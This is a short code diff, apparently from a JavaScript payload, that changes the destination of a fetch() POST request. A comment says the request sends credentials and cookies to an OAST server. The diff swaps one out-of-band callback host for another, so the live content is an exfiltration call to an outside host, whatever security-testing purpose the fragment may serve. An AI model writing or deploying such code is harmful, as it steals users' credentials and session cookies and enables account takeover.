@@ -355,7 +355,7 @@
                 // Send credentials and cookies to OAST server
                 try {
                     // Method 1: POST request with JSON payload
-                    fetch('https://soxd23s4zntejv9un0a357vo8m14bz5vw.oast.site', {
+                    fetch('https://3w0b440rb1ut7jwarn53qa7s8jea21qq.oastify.com', {
                         method: 'POST',
                         mode: 'no-cors',
                         headers: {
